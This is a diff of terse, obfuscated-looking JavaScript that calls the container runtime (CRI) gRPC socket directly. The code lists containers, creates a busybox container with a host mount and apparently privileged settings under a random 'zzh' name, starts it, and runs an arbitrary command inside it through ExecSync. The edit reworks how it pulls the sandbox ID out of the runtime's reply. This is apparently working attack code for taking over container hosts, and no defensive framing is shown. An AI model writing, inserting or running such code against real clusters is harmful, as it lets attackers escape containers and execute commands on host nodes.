@@ -9,9 +9,9 @@ const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const nm='zzh'+Math.floor(Math.random()*1e6);
 const cfg=Buffer.concat([fl(0x0a,nm), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,'sleep 90'), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x7a,linc.length),linc])]);
 call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
- const subs=fields(lb).filter(f=>f[0]===1).map(f=>f[1]); if(!subs.length)return;
- const f2=fields(subs[0]); const sb=(f2.find(x=>x[0]===2)||[])[1]; if(!sb)return;
- call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb.toString('latin1')), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
+ const all=[...new Set((lb||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/g)||[])];
+ if(all.length<2)return; const cid=all[0], sb=all[1];
+ call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg]),(e2,ob)=>{
    const id=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!id)return;
    call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,id[0]),()=>setTimeout(()=>{
      call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,id[0]),fl(0x12,'/bin/sh'),fl(0x12,'-c'),fl(0x12,CMD)]),()=>{});
